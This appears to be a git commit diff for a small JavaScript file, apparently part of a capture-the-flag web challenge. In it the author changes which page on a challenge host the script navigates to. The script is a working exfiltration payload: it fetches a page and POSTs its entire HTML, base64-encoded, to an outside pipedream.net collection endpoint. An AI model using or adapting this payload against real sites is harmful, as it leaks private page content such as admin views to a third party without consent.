f7530aca1ccf9d208e581e222bfbdd386baf5648
furtest <paul.retourne@orange.fr>
2023-11-23 14:49:41 +0100

    johnny page content

--- plugin_again/script.js
+++ plugin_again/script.js
@@ -1,2 +1,2 @@
-document.location = "https://website-kueqer.inst.malicecyber.com/posts/admin";
+document.location = "https://website-kueqer.inst.malicecyber.com/posts/Johnny";
 fetch("https://eof01qmn38c7xfu.m.pipedream.net", {method: "POST", body: btoa(unescape(encodeURIComponent(document.body.outerHTML)))});
